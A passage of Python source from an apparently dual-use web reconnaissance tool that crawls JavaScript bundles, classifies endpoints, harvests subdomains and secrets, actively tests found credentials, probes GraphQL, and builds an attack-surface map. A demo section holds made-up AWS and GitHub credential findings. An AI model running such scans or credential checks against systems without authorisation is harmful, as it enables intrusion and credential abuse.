                        "sources": len(result.recovered_files),
                    })
                    recovered_files.extend(result.recovered_files)
        all_js.extend(recovered_files)
        extras["source_map_details"] = sm_details
        extras["recovered_sources"]  = len(recovered_files)
        if not args.quiet:
            phase_done("Source map analysis",
                f"{sm_details['discovered']} maps  {len(recovered_files)} sources recovered")

    # ── Webpack chunks ────────────────────────────────────────────────────────
    chunk_stats = {"runtime": False, "discovered": 0, "downloaded": 0}
    if args.chunks:
        if not args.quiet:
            phase("Discovering webpack chunks")
        from .discovery.webpack_chunks import fetch_chunks, detect_webpack
        seen_chunk_urls = {js.url for js in all_js}
        chunk_files     = []
        for js_file in list(all_js):
            if detect_webpack(js_file.content):
                chunk_stats["runtime"] = True
            chunks = fetch_chunks(js_file, fetcher, scope, seen_chunk_urls)
            chunk_files.extend(chunks)
        all_js.extend(chunk_files)
        chunk_stats["discovered"] = len(chunk_files)
        chunk_stats["downloaded"] = len(chunk_files)
        extras["chunk_stats"]  = chunk_stats
        extras["chunks_found"] = len(chunk_files)
        if not args.quiet:
            phase_done("Chunk discovery", f"{len(chunk_files)} chunks")

    # ── Analysis ──────────────────────────────────────────────────────────────
    if not args.quiet:
        phase("Analyzing JavaScript")
    import time as _time
    import logging as _logging
    _logger = _logging.getLogger("bundlespy.cli")
    _t_analysis = _time.monotonic()
    scanner = SecretScanner()
    all_findings, all_endpoints, all_infra, _graphql_ops = _analyze(all_js, scanner)
    _analysis_ms = int((_time.monotonic() - _t_analysis) * 1000)
    _logger.info("JS analysis took %dms for %d files", _analysis_ms, len(all_js))

    # Re-categorize UNKNOWN endpoints using full classifier
    from .analysis.endpoints import _categorize_path as _recat
    from urllib.parse import urlparse as _uprc
    for _ep in all_endpoints:
        if _ep.category in ("UNKNOWN", ""):
            _ep_path = _uprc(_ep.url).path or _ep.url
            _ep.category = _recat(_ep_path)

    # Upgrade any UNKNOWN endpoint that the crawler actually visited to ROUTE.
    # These are real pages confirmed to exist - no reason to show them as UNKNOWN.
    _visited_pages_norm = set()
    if not args.passive:
        for _vp in (getattr(crawler, "visited_pages", set()) or set()):
            _visited_pages_norm.add(_vp.rstrip("/").lower().split("?")[0])
    for _ep in all_endpoints:
        if _ep.category in ("UNKNOWN", "") and _visited_pages_norm:
            _ep_key = _ep.url.rstrip("/").lower().split("?")[0]
            if _ep_key in _visited_pages_norm:
                _ep_lower = _uprc(_ep.url).path.lower()
                if any(k in _ep_lower for k in ["/login", "/logout", "/auth", "/register", "/signin", "/signup"]):
                    _ep.category = "AUTH"
                elif any(k in _ep_lower for k in ["/admin", "/administration", "/manage"]):
                    _ep.category = "ADMIN"
                elif "/graphql" in _ep_lower:
                    _ep.category = "GRAPHQL"
                elif any(k in _ep_lower for k in ["/api/", "/rest/", "/v1/", "/v2/"]):
                    _ep.category = "API"
                else:
                    _ep.category = "ROUTE"

    # Fix method=UNKNOWN on visited pages - they were accessed via GET by definition.
    # Headless-discovered routes often lack a method because they come from URL
    # navigation, not from a captured HTTP request with an explicit verb.
    for _ep in all_endpoints:
        if not _ep.method or _ep.method in ("UNKNOWN", ""):
            _ep_key = _ep.url.rstrip("/").lower().split("?")[0]
            # Mark as GET if crawler visited it, or if headless set access_state
            _ep_visited = _ep_key in _visited_pages_norm
            _ep_access  = getattr(_ep, "access_state", "") in ("PUBLIC", "VISITED")
            _ep_http    = getattr(_ep, "http_status", 0)
            if _ep_visited or (_ep_access and _ep_http and _ep_http < 400):
                _ep.method = "GET"

    # ── Intelligent endpoint classification ───────────────────────────────────
    # Score every candidate. Drop noise (chart tokens, bare words, lib internals).
    # LOW confidence endpoints are kept only when -v / --verbose is set.
    # Optional HTTP verification happens here before the validation phase.
    _candidates = classify_endpoints(all_endpoints)

    # Optional lightweight HTTP verification for scored candidates
    # (separate from --validate which does deeper probing via endpoint_validator)
    if getattr(args, "validate", False) and fetcher is not None:
        _candidates = verify_candidates(
            _candidates,
            base_url  = target,
            fetcher   = fetcher,
            max_verify = 100,
        )

    # Debug dump of scoring breakdown with -vv / --debug
    if getattr(args, "debug", False):
        import logging as _clf_log
        _clf_logger = _clf_log.getLogger("bundlespy.analysis.endpoint_classifier")
        _clf_logger.debug("\n--- Endpoint classifier scoring ---\n%s", debug_dump(_candidates))

    # Filter based on verbosity
    _before = len(all_endpoints)
    if getattr(args, "verbose", False) or getattr(args, "debug", False):
        # -v: show HIGH + LOW confidence
        all_endpoints = verbose_output(_candidates)
    else:
        # normal: HIGH confidence only
        all_endpoints = confirmed_only(_candidates)

    _after = len(all_endpoints)
    if not args.quiet and _before != _after:
        _logger.info(
            "Endpoint classifier: %d candidates -> %d kept, %d dropped as noise",
            _before, _after, _before - _after,
        )

    # Merge HTML attribute findings BEFORE building per-file stats
    # so html: findings are visible to the stats builder
    html_findings_from_crawler = locals().get("html_findings_from_crawler", [])
    seen_html = {f.sha256 for f in all_findings}
    for f in html_findings_from_crawler:
        if f.sha256 not in seen_html:
            seen_html.add(f.sha256)
            all_findings.append(f)

    # Per-file analysis breakdown — prove every file was analyzed
    # Build per-file stats from already-computed findings and endpoints
    # Strip all URL prefixes for matching (html:, inline:, sourcemap://, etc.)
    def _strip_url_prefix(url: str) -> str:
        for pfx in ["html:", "inline:", "sourcemap://", "local://", "headless://"]:
            if url.startswith(pfx):
                return url[len(pfx):].rstrip("/")
        return url.rstrip("/")

    # Build lookup: stripped_url -> count
    _findings_by_stripped = {}
    for _f in all_findings:
        _fkey = _strip_url_prefix(_f.file_url or "")
        if _f.status != "likely_false_positive":
            _findings_by_stripped[_fkey] = _findings_by_stripped.get(_fkey, 0) + 1

    _endpoints_by_stripped = {}
    for _ep in all_endpoints:
        _ekey = _strip_url_prefix(getattr(_ep, "source_file", "") or "")
        _endpoints_by_stripped[_ekey] = _endpoints_by_stripped.get(_ekey, 0) + 1

    # Per-file stats — run each extractor on each file individually
    # HTML attribute findings (html: prefix) are PAGE-level, not script-level
    # They are shown separately — we do NOT assign them to inline scripts
    from .analysis.endpoint_intel import extract_endpoint_intelligence as _ep_intel
    from .analysis.ast_endpoints import extract_all_endpoints as _ast_ep

    # Per-file stats — map already-computed findings/endpoints back to each file
    # This is accurate because it uses the SAME findings already verified correct
    # Re-running the scanner would get different results due to env/path differences

    # Build lookup: file_url (stripped) -> secret count
    _sec_by_file = {}
    for _f in all_findings:
        if _f.status == "likely_false_positive":
            continue
        _furl = _f.file_url or ""
        _fkey = _strip_url_prefix(_furl)
        _sec_by_file[_fkey] = _sec_by_file.get(_fkey, 0) + 1

    # Build lookup: source_file (stripped) -> endpoint count
    _ep_by_file = {}
    for _ep in all_endpoints:
        _ekey = _strip_url_prefix(getattr(_ep, "source_file", "") or "")
        _ep_by_file[_ekey] = _ep_by_file.get(_ekey, 0) + 1

    # Build lookup: source_file (stripped) -> infra count
    _infra_by_file = {}
    for _inf in all_infra:
        _ikey = _strip_url_prefix(getattr(_inf, "source_file", "") or "")
        _infra_by_file[_ikey] = _infra_by_file.get(_ikey, 0) + 1

    # Track which inline pages already showed their secret count
    # to avoid repeating it on every inline script from the same page
    _inline_page_shown = set()

    per_file_stats = []
    for js in all_js:
        if not js.content:
            continue

        _js_key = _strip_url_prefix(js.url)
        _is_inline = js.url.startswith("inline:") or js.url.startswith("html:")

        if _is_inline:
            _sec_count = _sec_by_file.get(_js_key, 0)
        else:
            _sec_count = _sec_by_file.get(_js_key, 0)

        per_file_stats.append({
            "url":        js.url,
            "size":       js.size_bytes,
            "sha256":     js.sha256[:8] if js.sha256 else "",
            "secrets":    _sec_count,
            "endpoints":  _ep_by_file.get(_js_key, 0),
            "infra":      _infra_by_file.get(_js_key, 0),
            "technology": getattr(js, "technology", ""),
            "note":       "",
        })

    # HTML attribute findings — completely separate section, never merged into inline JS
    # Each page that has html: findings gets its own row, independent of inline scripts
    _html_pages = {}
    for _f in all_findings:
        if _f.status == "likely_false_positive":
            continue
        _furl = _f.file_url or ""
        if _furl.startswith("html:"):
            _page = _furl[5:]
            _html_pages[_page] = _html_pages.get(_page, 0) + 1

    for _page_url, _count in _html_pages.items():
        per_file_stats.append({
            "url":        "html:" + _page_url,
            "size":       0,
            "sha256":     "",
            "secrets":    _count,
            "endpoints":  0,
            "infra":      0,
            "technology": "html-attrs",
            "note":       "HTML attributes",
        })

    extras["per_file_stats"] = per_file_stats

    # Add every crawled page as a discovered route endpoint
    # These are real pages the crawler actually visited
    if not args.passive:
        from urllib.parse import urlparse as _up
        from .storage.models import Endpoint as _Endpoint
        _crawled_pages = getattr(crawler, "visited_pages", set()) or set()
        _seen_ep = {ep.url.rstrip("/").lower().split("?")[0] for ep in all_endpoints}
        for _page_url in _crawled_pages:
            _pp   = _up(_page_url)
            _path = _pp.path or "/"
            _key  = _page_url.rstrip("/").lower().split("?")[0]
            if _key in _seen_ep:
                continue
            # Skip bare root and /index duplicates
            if _path in ("/", "/index", "/index.html", "/index.php", ""):
                continue
            # Skip if the full URL is just the target root
            if _page_url.rstrip("/").lower() == target.rstrip("/").lower():
                continue
            _seen_ep.add(_key)
            # Categorize the page route
            _lower = _path.lower()
            if any(k in _lower for k in ["/login", "/logout", "/auth", "/register", "/signin", "/signup"]):
                _cat = "AUTH"
            elif any(k in _lower for k in ["/admin", "/administration", "/manage"]):
                _cat = "ADMIN"
            elif "/graphql" in _lower:
                _cat = "GRAPHQL"
            elif any(k in _lower for k in ["/api/", "/rest/", "/v1/", "/v2/"]):
                _cat = "API"
            else:
                _cat = "ROUTE"
            # Query params from the page URL
            _qp = []
            if _pp.query:
                for _pair in _pp.query.split("&"):
                    _n = _pair.split("=")[0]
                    if _n:
                        _qp.append({"name": _n})
            all_endpoints.append(_Endpoint(
                url=_page_url, path=_path, method="GET",
                category=_cat, source_file="crawler://page",
                line_number=0, confidence=0.99,
                host=_pp.netloc, query_params=_qp,
                path_params=[], body_fields=[], request_headers={},
                auth_context="", evidence="Crawled page", kind="route",
            ))

    # Merge headless-intercepted endpoints (real network calls, high confidence)
    if args.headless and "all_endpoints_extra" in dir():
        from urllib.parse import urlparse as _upep
        seen_ep_keys = {ep.url.rstrip("/").lower().split("?")[0] for ep in all_endpoints}
        for ep in all_endpoints_extra:
            key = ep.url.rstrip("/").lower().split("?")[0]
            if key not in seen_ep_keys:
                # Bug fix: filter out-of-scope external URLs (portfolio links, 3rd-party)
                if not scope.in_scope(ep.url):
                    ep.category = "EXTERNAL"
                    # Still track them but don't mix into main attack surface
                    # Only append EXTERNAL endpoints if they were explicitly discovered
                    # as API calls (not plain page navigations)
                    if ep.kind not in ("route", "page", ""):
                        all_endpoints.append(ep)
                    continue
                seen_ep_keys.add(key)
                # Bug fix: re-categorize UNKNOWN endpoints with same logic as crawler
                # _categorize_path() never returns ROUTE - we must handle that here
                if ep.category in ("UNKNOWN", ""):
                    _ep_path = _upep(ep.url).path or ep.url
                    _ep_lower = _ep_path.lower()
                    if any(k in _ep_lower for k in ["/login", "/logout", "/auth", "/register", "/signin", "/signup"]):
                        ep.category = "AUTH"
                    elif any(k in _ep_lower for k in ["/admin", "/administration", "/manage", "/dashboard"]):
                        ep.category = "ADMIN"
                    elif "/graphql" in _ep_lower:
                        ep.category = "GRAPHQL"
                    elif any(k in _ep_lower for k in ["/api/", "/rest/", "/v1/", "/v2/", "/v3/"]):
                        ep.category = "API"
                    elif "/ws" in _ep_lower or _ep_path.startswith("ws"):
                        ep.category = "WEBSOCKET"
                    elif any(k in _ep_lower for k in ["/upload", "/uploads", "/import"]):
                        ep.category = "UPLOAD"
                    elif any(k in _ep_lower for k in ["/download", "/exports", "/export"]):
                        ep.category = "DOWNLOAD"
                    elif ep.kind in ("route", "page") or ep.source_file in ("headless://route", "headless://page"):
                        ep.category = "ROUTE"
                    else:
                        ep.category = "ROUTE"  # headless-discovered pages are frontend routes
                all_endpoints.append(ep)
    if not args.quiet:
        phase_done("Analysis complete",
            f"{len(all_findings)} findings  {len(all_endpoints)} endpoints  {len(all_infra)} infrastructure")

    # Deduplicate findings by rule + value — same secret on multiple pages
    # becomes ONE finding with all occurrences listed
    _finding_map = {}
    _deduped_findings = []
    for f in all_findings:
        dedup_key = f"{f.rule_id}:{f.matched_value}"
        if dedup_key in _finding_map:
            # Add this location to the existing finding's occurrences
            existing = _finding_map[dedup_key]
            loc = f"{f.file_url}:{f.line_number}"
            if not existing.occurrences:
                existing.occurrences = []
            if loc not in existing.occurrences:
                existing.occurrences.append(loc)
        else:
            _finding_map[dedup_key] = f
            loc = f"{f.file_url}:{f.line_number}"
            if not f.occurrences:
                f.occurrences = [loc]
            _deduped_findings.append(f)
    all_findings = _deduped_findings

    # Remove bare target root from endpoints — it's not an API endpoint
    _target_base = target.rstrip("/").lower()
    all_endpoints = [
        ep for ep in all_endpoints
        if ep.url.rstrip("/").lower() not in (_target_base, _target_base + "/")
        and not (ep.url.rstrip("/").lower() == _target_base and ep.method == "UNKNOWN")
    ]

    # Final endpoint dedup — keep parameterized endpoints distinct
    # Dedup by path + sorted param names (not param values)
    # so /product?productId=1 and /product?productId=2 merge to one,
    # but /product?productId and /product?category stay separate
    seen_final = set()
    deduped = []
    for ep in all_endpoints:
        from urllib.parse import urlparse as _upx
        _p = _upx(ep.url)
        _path = _p.path.rstrip("/").lower()
        # Build param signature from query param names
        _param_names = sorted(qp.get("name", "") for qp in (ep.query_params or []))
        _param_sig = ",".join(_param_names)
        # Method + path + param names = unique attack surface
        key = f"{ep.method}:{_path}?{_param_sig}"
        if key not in seen_final:
            seen_final.add(key)
            deduped.append(ep)
    all_endpoints = deduped

    # ── Attack surface analysis ────────────────────────────────────────────────
    from .analysis.attack_surface import analyze_attack_surface
    attack_surface = analyze_attack_surface(all_endpoints)
    extras["attack_surface"] = attack_surface

    # ── Vulnerable library detection ───────────────────────────────────────────
    if not args.quiet and not getattr(args, "silent", False):
        phase("Scanning for vulnerable libraries")
    from .analysis.library_scanner import scan_for_vulnerable_libraries
    lib_findings = []
    lib_seen = set()
    for js in all_js:
        for lf in scan_for_vulnerable_libraries(js.content, js.url):
            key = f"{lf.library}:{lf.version}:{lf.cve_id}"
            if key not in lib_seen:
                lib_seen.add(key)
                lib_findings.append(lf)
    extras["lib_findings"] = lib_findings
    if not args.quiet and not getattr(args, "silent", False):
        if lib_findings:
            # Count unique libraries vs total CVEs
            unique_libs = len(set(f"{l.library}:{l.version}" for l in lib_findings))
            total_cves  = len(lib_findings)
            crit = sum(1 for l in lib_findings if l.severity == "CRITICAL")
            high = sum(1 for l in lib_findings if l.severity == "HIGH")

            lib_word = "library" if unique_libs == 1 else "libraries"
            cve_word = "vulnerability" if total_cves == 1 else "vulnerabilities"
            detail = f"{total_cves} {cve_word} in {unique_libs} {lib_word}"
            if crit: detail += f"  {crit} critical"
            if high: detail += f"  {high} high"
            phase_done("Library scan", detail)
        else:
            phase_done("Library scan", "no known vulnerable libraries")

    # Update chunk stats with findings
    if args.chunks:
        chunk_stats["findings"]  = len([f for f in all_findings if any(c.technology == "webpack-chunk" for c in all_js if c.url == f.file_url)])
        chunk_stats["endpoints"] = len([e for e in all_endpoints if any(c.technology == "webpack-chunk" for c in all_js if c.url == e.source_file)])

    # ── Subdomain harvesting ──────────────────────────────────────────────────
    subdomains = []
    if args.harvest_subs:
        if not args.quiet:
            phase("Harvesting subdomains")
        from .discovery.subdomains import harvest_subdomains
        subdomains = harvest_subdomains(
            target,
            [js.content for js in all_js],
            [ep.url for ep in all_endpoints],
        )
        extras["subdomains"] = len(subdomains)
        if not args.quiet:
            phase_done("Subdomain harvest", f"{len(subdomains)} subdomains")

    # ── Endpoint validation ───────────────────────────────────────────────────
    validation_results = []
    if args.validate and all_endpoints:
        if not args.quiet:
            phase(f"Validating {len(all_endpoints)} endpoints")
        from .analysis.endpoint_validator import validate_endpoints
        validation_results = validate_endpoints(
            all_endpoints, target, scope,
            stealth=args.stealth, rate=max(1, args.rate // 2),
        )
        interesting = sum(1 for r in validation_results if r.interesting)
        if not args.quiet:
            phase_done("Endpoint validation", f"{interesting} interesting")

    # ── GraphQL ───────────────────────────────────────────────────────────────
    graphql_schemas = []
    if args.graphql and all_endpoints:
        if not args.quiet:
            phase("GraphQL introspection")
        from .analysis.graphql import find_graphql_endpoints, introspect
        gql_urls = find_graphql_endpoints(all_endpoints)
        for gql_url in gql_urls:
            schema = introspect(gql_url, stealth=args.stealth)
            if schema:
                graphql_schemas.append(schema)
        total_ops = sum(len(s.queries) + len(s.mutations) for s in graphql_schemas if not s.error)
        extras["graphql_queries"] = total_ops
        if not args.quiet:
            phase_done("GraphQL", f"{len(gql_urls)} endpoints  {total_ops} operations")

    # ── Secret validation ─────────────────────────────────────────────────────
    if args.validate_secrets and all_findings:
        if not args.quiet:
            phase("Validating secrets")
        from .analysis.secret_validator import validate_finding
        validated = 0
        for finding in all_findings:
            if finding.status == "likely_false_positive":
                continue
            vr = validate_finding(finding.rule_id, finding.matched_value)
            if vr and vr.valid:
                finding.confidence_label = "likely_secret"
                # Update provenance to reflect active validation
                if finding.provenance is None:
                    from .storage.models import Provenance
                    finding.provenance = Provenance.from_finding(finding)
                from .storage.models import ValidationStatus
                finding.provenance.validation_status = ValidationStatus.CONFIRMED
                finding.provenance.validation_reason = vr.detail
                finding.description += f" | VALIDATED: {vr.detail}"
                validated += 1
        if not args.quiet:
            phase_done("Secret validation", f"{validated} confirmed active")

    # ── Build result ──────────────────────────────────────────────────────────
    finished = datetime.utcnow()
    # Stage 6: collect page access states from crawler
    _page_access_states = getattr(crawler if not args.passive else None, "page_access_states", {}) or {}

    result = ScanResult(
        target_url     = target,
        started_at     = started,
        finished_at    = finished,
        pages_crawled  = getattr(crawler if not args.passive else None, "pages_crawled", 0) or 0,
        js_files       = all_js,
        findings       = all_findings,
        endpoints      = all_endpoints,
        infrastructure = all_infra,
        errors         = errors,
    )

    # Stage 6: wire page_states using state_intelligence after result is built
    if _page_access_states:
        try:
            from .analysis.state_intelligence import build_page_states, apply_states_to_endpoints
            result.page_states = build_page_states(_page_access_states)
            apply_states_to_endpoints(result.endpoints, result.page_states)
        except Exception as _sie:
            import logging as _silog
            _silog.getLogger("bundlespy.cli").warning("State intelligence failed: %s", _sie)

    # ── Attack surface graph ───────────────────────────────────────────────────
    # Build the relationship graph from the completed scan result.
    # This is O(n) and adds no network I/O — pure in-memory assembly.
    try:
        from .storage.graph import AttackSurfaceGraph
        result.graph = AttackSurfaceGraph.from_scan_result(result)
        extras["graph"] = result.graph
    except Exception as _ge:
        import logging as _gl
        _gl.getLogger("bundlespy.cli").warning("Graph build failed: %s", _ge)

    # ── Coverage metrics ──────────────────────────────────────────────────────
    from .analysis.coverage import compute_coverage
    coverage = compute_coverage(
        js_files            = all_js,
        endpoints           = all_endpoints,
        findings            = all_findings,
        pages_crawled       = getattr(crawler if not args.passive else None, "pages_crawled", 0) or 0,
        headless_used       = args.headless,
        source_maps         = args.source_maps,
        chunks_used         = args.chunks,
        passive_used        = args.passive,
        has_cookie          = bool(args.cookie),
        has_headless_routes = extras.get("headless_stats", {}).get("routes", 0),
        lib_findings        = extras.get("lib_findings", []),
        scan_errors         = errors,
        headless_stats      = extras.get("headless_stats", {}),
        sm_details          = extras.get("source_map_details", {}),
        visited_pages       = getattr(crawler if not args.passive else None, "visited_pages", set()) or set(),
        max_pages           = getattr(args, "max_pages", 0) or 0,
    )
    extras["coverage"] = coverage

    # ── Stage 5: Passive Validation + Coverage Ledger ─────────────────────────
    # Passive validation runs in a background thread so report generation can
    # start immediately. We join the thread before printing the terminal report.
    passive_report  = None
    coverage_ledger = None
    _passive_thread = None
    _passive_result: list = [None]   # mutable container for thread return value

    try:
        from .analysis.passive_validator import run_passive_validation
        from .analysis.coverage import build_coverage_ledger

        if not getattr(args, "no_passive_validate", False):
            phase("Stage 5 — passive validation of HIGH/CRITICAL findings (background)")

            def _run_validation():
                try:
                    _passive_result[0] = run_passive_validation(
                        findings   = all_findings,
                        scope      = scope,
                        stealth    = args.stealth,
                        rate       = min(args.rate, 3),
                        max_probes = 50,
                    )
                except Exception as _ve:
                    import logging as _vl
                    _vl.getLogger("bundlespy.cli").debug("Passive validation error: %s", _ve)

            import threading as _threading
            _passive_thread = _threading.Thread(
                target  = _run_validation,
                name    = "passive-validator",
                daemon  = True,
            )
            _passive_thread.start()

        # Build coverage ledger now - doesn't depend on passive validation
        coverage_ledger = build_coverage_ledger(all_findings, all_endpoints)
    except Exception as _s5e:
        import logging as _s5l
        _s5l.getLogger("bundlespy.cli").debug("Stage 5 error: %s", _s5e)

    extras["passive_report"]  = passive_report
    extras["coverage_ledger"] = coverage_ledger

    # ── Attack Testing Engine ─────────────────────────────────────────────────
    attack_report = None
    if not args.passive:
        try:
            from .testing.engine import SurfaceMappingEngine
            from .testing.reporter import print_surface_report
            if not args.quiet and not getattr(args, "silent", False):
                phase("Mapping attack surface")
            _engine = SurfaceMappingEngine(
                fetcher         = fetcher,
                scope           = scope,
                rate_per_second = max(1.0, args.rate / 2),
                verbose         = getattr(args, "verbose", False),
            )
            attack_report = _engine.run(result)
            extras["attack_report"] = attack_report
            if not args.quiet and not getattr(args, "silent", False):
                _candidates = attack_report.total_candidates
                _mapped     = attack_report.total_mapped
                _label = f"{_candidates} candidates  {_mapped} mapped"
                phase_done("Attack surface", _label)
        except Exception as _ae:
            import logging as _ael
            _ael.getLogger("bundlespy.cli").warning("Attack engine error: %s", _ae)

    # ── Reports ───────────────────────────────────────────────────────────────
    file_paths = {}
    file_formats = [f for f in formats if f != "terminal"]
    if file_formats:
        file_paths = _write_reports(result, file_formats, args.output, started,
                                    report_name=getattr(args, "report_name", ""),
                                    extras=extras, validation_results=validation_results,
                                    graphql_schemas=graphql_schemas, subdomains=subdomains)

    # Join the background passive validation thread before printing so the
    # terminal report shows validated/confirmed statuses.
    if _passive_thread is not None:
        _passive_thread.join(timeout=30)   # at most 30s extra wait
        passive_report = _passive_result[0]
        extras["passive_report"] = passive_report
        if passive_report is not None and passive_report.probed:
            phase_done(
                "Passive validation",
                f"{passive_report.confirmed} confirmed  "
                f"{passive_report.unreachable} unreachable  "
                f"{passive_report.probed} probed",
            )

    if "terminal" in formats and not args.quiet and not getattr(args, "silent", False):
        print_report(
            result,
            verbose             = args.verbose,
            no_color            = args.no_color,
            extras              = extras,
            validation_results  = validation_results,
            graphql_schemas     = graphql_schemas,
            subdomains          = subdomains,
            report_paths        = file_paths,
            passive_report      = passive_report,
            coverage_ledger     = coverage_ledger,
        )
        if attack_report is not None:
            try:
                from .testing.reporter import print_surface_report
                print_surface_report(attack_report)
            except Exception as _are:
                import logging as _arl
                _arl.getLogger("bundlespy.cli").warning("Attack report print error: %s", _are)
    elif getattr(args, "silent", False):
        # Silent mode — print only findings, one per line
        real = [f for f in all_findings if f.status != "likely_false_positive"]
        for f in real:
            print(f"[{f.severity}] {f.title} | {f.file_url}:{f.line_number} | {f.matched_value}")
    elif args.quiet and file_paths:
        for fmt, path in file_paths.items():
            print(path)

    critical = [f for f in all_findings
                if f.severity == "CRITICAL" and f.status != "likely_false_positive"]
    return 1 if critical else 0


def run_local(args) -> int:
    _setup_logging(args.verbose, False, False)
    if args.no_color or os.environ.get("NO_COLOR"):
        os.environ["NO_COLOR"] = "1"

    path = args.path
    if not args.verbose:
        from .ui.printer import phase
        phase(f"Local scan: {path}")

    from .discovery.local_scanner import load_local_files
    js_files = load_local_files(path)

    if not js_files:
        phase_error("No JavaScript files found.")
        return 0

    scanner = SecretScanner()
    all_findings, all_endpoints, all_infra, _graphql_ops = _analyze(js_files, scanner)

    started  = datetime.utcnow()

    # Re-categorize UNKNOWN endpoints
    from .analysis.endpoints import _categorize_path as _recat
    from urllib.parse import urlparse as _uprc
    for _ep in all_endpoints:
        if _ep.category in ("UNKNOWN", ""):
            _ep_path = _uprc(_ep.url).path or _ep.url
            _ep.category = _recat(_ep_path)

    # ── Vulnerable library detection ──────────────────────────────────────────
    if not args.verbose:
        phase("Scanning for vulnerable libraries")
    from .analysis.library_scanner import scan_for_vulnerable_libraries
    lib_findings = []
    lib_seen = set()
    for js in js_files:
        for lf in scan_for_vulnerable_libraries(js.content, js.url):
            key = f"{lf.library}:{lf.version}:{lf.cve_id}"
            if key not in lib_seen:
                lib_seen.add(key)
                lib_findings.append(lf)

    if not args.verbose:
        if lib_findings:
            unique_libs = len(set(f"{l.library}:{l.version}" for l in lib_findings))
            total_cves  = len(lib_findings)
            crit = sum(1 for l in lib_findings if l.severity == "CRITICAL")
            high = sum(1 for l in lib_findings if l.severity == "HIGH")
            detail = f"{total_cves} CVEs in {unique_libs} libraries"
            if crit: detail += f"  {crit} critical"
            if high: detail += f"  {high} high"
            phase_done("Library scan", detail)
        else:
            phase_done("Library scan", "no known vulnerable libraries")

    # ── Attack surface analysis ───────────────────────────────────────────────
    from .analysis.attack_surface import analyze_attack_surface
    attack_surface = analyze_attack_surface(all_endpoints)

    finished = datetime.utcnow()

    result = ScanResult(
        target_url=f"local://{path}", started_at=started, finished_at=finished,
        pages_crawled=0, js_files=js_files,
        findings=all_findings, endpoints=all_endpoints,
        infrastructure=all_infra, errors=[],
    )

    # ── Coverage metrics ──────────────────────────────────────────────────────
    from .analysis.coverage import compute_coverage
    coverage = compute_coverage(
        js_files      = js_files,
        endpoints     = all_endpoints,
        findings      = all_findings,
        pages_crawled = 0,
        headless_used = False,
        source_maps   = False,
        chunks_used   = False,
        passive_used  = False,
        has_cookie    = False,
        lib_findings  = lib_findings,
        scan_errors   = [],
    )

    extras = {
        "local_path":     path,
        "lib_findings":   lib_findings,
        "attack_surface": attack_surface,
        "coverage":       coverage,
    }

    formats = [f.strip() for f in args.format.split(",")]
    file_paths = {}
    file_formats = [f for f in formats if f != "terminal"]
    if file_formats:
        file_paths = _write_reports(result, file_formats, args.output, started,
                                    report_name=getattr(args, "report_name", ""),
                                    extras=extras)

    if "terminal" in formats:
        print_report(
            result,
            verbose=args.verbose,
            no_color=args.no_color,
            extras=extras,
            report_paths=file_paths,
        )

    critical = [f for f in all_findings
                if f.severity == "CRITICAL" and f.status != "likely_false_positive"]
    return 1 if critical else 0


def run_demo(args=None) -> int:
    from .storage.models import JSFile, Finding, Endpoint, InfrastructureItem, ScanResult
    from .analysis.library_scanner import LibraryFinding
    import hashlib
    from datetime import timedelta

    # ── Demo JS file inventory ─────────────────────────────────────────────────
    def _js(url, size, tech="React"):
        return JSFile(
            url=url, source_page="https://demo.example.com/",
            status_code=200, content_type="application/javascript",
            size_bytes=size, sha256=hashlib.sha256(url.encode()).hexdigest(),
            content="", technology=tech,
        )

    base = "https://demo.example.com/static/js"
    fake_js_files = [
        _js(f"{base}/main.8f31ab.chunk.js",        41_200, "React"),
        _js(f"{base}/vendors~main.a3c9f1.chunk.js", 284_400, "React/Webpack"),
        _js(f"{base}/2.f7e823.chunk.js",            18_900, "React"),
        _js(f"{base}/3.c14d90.chunk.js",            22_300, "React"),
        _js(f"{base}/runtime-main.e70e6c.js",        2_100, "Webpack"),
        _js("https://demo.example.com/static/js/auth.b2a17f.chunk.js", 9_800, "React"),
        _js("https://demo.example.com/static/js/admin.d4c881.chunk.js", 14_600, "React"),
    ]

    # Source-map recovered originals
    for name in [
        "src/api/client.js", "src/api/graphql.js", "src/components/UserTable.jsx",
        "src/components/AdminPanel.jsx", "src/utils/auth.js", "src/utils/jwt.js",
        "src/config/index.js", "src/config/aws.js",
    ]:
        fake_js_files.append(JSFile(
            url=f"sourcemap://{name}", source_page="https://demo.example.com/",
            status_code=200, content_type="application/javascript",
            size_bytes=3_400, sha256=hashlib.sha256(name.encode()).hexdigest(),
            content="", technology="React (source-mapped)",
        ))

    main_js = fake_js_files[0]

    # ── Findings ───────────────────────────────────────────────────────────────
    fake_findings = [
        # CRITICAL — AWS key (validated active)
        Finding(
            id="demo001", rule_id="AWS_ACCESS_KEY", title="AWS Access Key ID",
            category="AWS", severity="CRITICAL", confidence=0.97,
            file_url=main_js.url, source_page=main_js.source_page,
            line_number=18291, column=12,
            matched_value="AKIAIOSFODNN7REALKEY",
            redacted_value="AKIA***************EY",
            sha256="abc001",
            context="const awsKey = 'AKIAIOSFODNN7REALKEY'",
            description="AWS Access Key ID hardcoded in production JS bundle. Key validated — GetCallerIdentity call returned account 123456789012.",
            impact="Full AWS credential exposure. Attacker can enumerate S3 buckets, IAM policies, and pivot to any service the key has access to.",
            remediation="Rotate immediately in AWS IAM console. Remove from source. Use SSM Parameter Store or Secrets Manager for runtime injection.",
            false_positive_notes="", confidence_label="likely_secret",
            occurrences=["main.8f31ab.chunk.js:18291", "src/config/aws.js:14"],
        ),
        # CRITICAL — GitHub PAT (validated active)
        Finding(
            id="demo002", rule_id="GITHUB_PAT", title="GitHub Personal Access Token",
            category="GitHub", severity="CRITICAL", confidence=0.99,
            file_url="sourcemap://src/config/index.js", source_page=main_js.source_page,
            line_number=14, column=22,
            matched_value="ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ012345",
            redacted_value="ghp_aBcD...5678",
            sha256="abc002",
            context="const GITHUB_TOKEN = 'ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ012345'",
            description="GitHub PAT validated active via /user endpoint — belongs to org admin account example-org.",
            impact="Full read/write access to private repositories. Attacker can exfiltrate source code, inject backdoors via commits, or enumerate org members.",
            remediation="Revoke token immediately at github.com/settings/tokens. Audit recent API usage in org security log.",
            false_positive_notes="", confidence_label="likely_secret",
            occurrences=["src/config/index.js:14"],
        ),
        # HIGH — JWT with alg:none
        Finding(
            id="demo003", rule_id="JWT_ALG_NONE", title="JWT with alg:none",
            category="JWT", severity="HIGH", confidence=0.94,
            file_url="sourcemap://src/utils/jwt.js", source_page=main_js.source_page,
            line_number=47, column=8,
